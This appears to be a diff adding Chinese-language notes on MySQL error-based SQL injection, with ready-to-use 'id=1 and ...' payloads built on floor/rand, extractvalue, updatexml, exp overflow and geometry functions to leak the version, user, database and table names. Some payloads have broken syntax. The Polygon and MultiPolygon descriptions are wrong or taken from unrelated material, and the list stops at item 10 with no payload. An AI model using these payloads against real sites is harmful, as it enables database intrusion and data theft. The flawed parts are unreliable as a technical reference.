@@ -1,0 +1,196 @@
+
+1.Floor()
+
+round() 遵循四舍五入把原值转化为指定小数位数，如：round(1.45,0) = 1;round(1.55,0)=2 floor()向下舍入为指定小数位数 如：floor(1.45,0)= 1;floor(1.55,0) = 1 ceiling()向上舍入为指定小数位数 如：ceiling(1.45,0) = 2;ceiling(1.55,0)=2
+
+floor(x)，返回小于或等于x的最大整数。
+
+x表示concat(database(),rand(0)*2)，rand(0)以0为随机种子产生0-1之间的随机数，*2产生0-2之间的随机数。
+
+报错原因：主键重复，必需：count()、rand()、group by
+
+payload:
+
+id=1 and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+
+
+2.ExtractValue()
+
+ExtractValue(xml_frag, xpath_expr)ExtractValue()接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。
+
+第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径
+
+例如：SELECT ExtractValue('<a><b><b/></a>', '/a/b'); 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。
+
+payload:
+
+id=1 and extractvalue(1, concat(0x7e, (select table_name from information_schema.tables limit 1)));
+
+
+3.UpdateXml()
+
+UPDATEXML (XML_document, XPath_string, new_value);
+
+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
+
+第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
+
+第三个参数：new_value，String格式，替换查找到的符合条件的数据
+
+而我们的注入语句为：
+
+id=1 and 1=(updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1))
+
+其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出
+
+ERROR 1105 (HY000): XPATH syntax error: ':root@localhost'
+
+
+4.Exp()
+
+exp是以e为底的指数函数，
+
+mysql> select exp(1);
++-------------------+
+| exp(1)            |
++-------------------+
+| 2.718281828459045 |
++-------------------+
+1 row in set (0.00 sec)
+
+但是，由于数字太大是会产生溢出。这个函数会在参数大于709时溢出，报错。
+
+mysql> select exp(709);
++-----------------------+
+| exp(709)              |
++-----------------------+
+| 8.218407461554972e307 |
++-----------------------+
+1 row in set (0.00 sec)
+
+mysql> select exp(710);
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
+
+将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值。
+
+mysql> select ~0;
++----------------------+
+| ~0                   |
++----------------------+
+| 18446744073709551615 |
++----------------------+
+1 row in set (0.00 sec)
+
+mysql> select ~(select version());
++----------------------+
+| ~(select version())  |
++----------------------+
+| 18446744073709551610 |
++----------------------+
+1 row in set, 1 warning (0.00 sec)
+
+我们通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。
+
+mysql> select exp(~(select * from(select database())x));
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select `x`.`database()` from (select database() AS `database()`) `x`)))'
+
+在脚本语言中，就会将错误中的一些表达式转化成相应的字符串，即像这样：
+
+DOUBLE value is out of range in 'exp(~((select 'error_based_hpf' from dual)))'
+
+从而实现了报错注入。
+
+payload：
+
+id=1 and exp(~(select * from(select user())a));
+
+
+5.GeometryCollection()
+
+GeometryCollection的理解：以点的方式存放 ，如果单个点直接用 坐标(x,y)表示，如果是线的话是多个点使用 LINESTRING()来保存这条线上的点。
+
+payload：
+
+id=1 and GeometryCollection(()select *from(select user())a)b);
+
+
+6.Polygon()
+
+Polygon该函数画一个由直线相闻的两个以上顶点组成的多边形，用当前画笔画多边形轮廓，用当前画刷和多边形填充模式填充多边形。
+
+如图中所示：
+
+图 1 是由外部环定义其边界的 Polygon 实例。
+
+图 2 是由外部环和两个内部环定义其边界的 Polygon 实例。 内部环内的面积是 Polygon 实例的外部环的一部分。
+
+图 3 是一个有效的 Polygon 实例，因为其内部环在单个切点处相交。
+
+payload：
+
+id =1 and polygon((select * from(select * from(select user())a)b));
+
+此注入点可以理解为limit后的注入点
+
+
+7.MultiPoint
+
+MultiPoint 是零个点或更多个点的集合。 MultiPoint 实例的边界为空。
+
+payload：
+
+id = 1 and multipoint((select * from(select * from(select user())a)b));
+
+
+8.MultiLineString()
+
+MultiLineString 是零个或多个 geometry 或 geographyLineString 实例的集合。
+
+如图中所示：
+
+图 1 显示的是一个简单的 MultiLineString 实例，其边界是其两个 LineString 元素的四个端点。
+
+图 2 显示的是一个简单的 MultiLineString 实例，因为只有 LineString 元素的端点相交。 边界是两个不重叠的端点。
+
+图 3 显示的是一个不简单的 MultiLineString 实例，因为它的其中一个 LineString 元素的内部出现了相交。 此 MultiLineString实例的边界是四个端点。
+
+图 4 显示的是一个不简单、非闭合的 MultiLineString 实例。
+
+图 5 显示的是一个简单、非闭合的 MultiLineString。 它没有闭合是因为它的 LineStrings 元素没有闭合。 而其简单的原因在于，其任何 LineStrings 实例的内部都没有出现相交。
+
+图 6 显示的是一个简单、闭合的 MultiLineString 实例。 它为闭合的是因为它的所有元素都是闭合的。 而其简单的原因在于，其所有元素都没有出现内部相交现象。
+
+payload：
+
+id = 1 and multilinestring((select * from(select * from(select user())a)b));
+
+
+9.LineString
+
+LineString 是一个一维对象，表示一系列点和连接这些点的线段。
+
+如图中所示：
+
+图 1 显示的是一个简单、非闭合的 LineString 实例。
+
+图 2 显示的是一个不简单、非闭合的 LineString 实例。
+
+图 3 显示的是一个闭合、简单的 LineString 实例，因此是一个环。
+
+图 4 显示的是一个闭合、不简单的 LineString 实例，因此不是一个环。
+
+payload：
+
+id = 1 and LINESTRING((select * from(select * from(select user())a)b));
+
+
+10.MultiPolygon()
+
+MultiPolygon实例是零个或更多个Polygon实例的集合。
+
+如图中所示：
+
+图 1 是一个包含两个 Polygon 元素的 MultiPolygon 实例。 边界由两个外环和三个内环界定。
+
+图 2 是一个包含两个 MultiPolygon 元素的 Polygon 实例。 边界由两个外环和三个内环界定。 这两个 Polygon 元素在切点处相交。
+
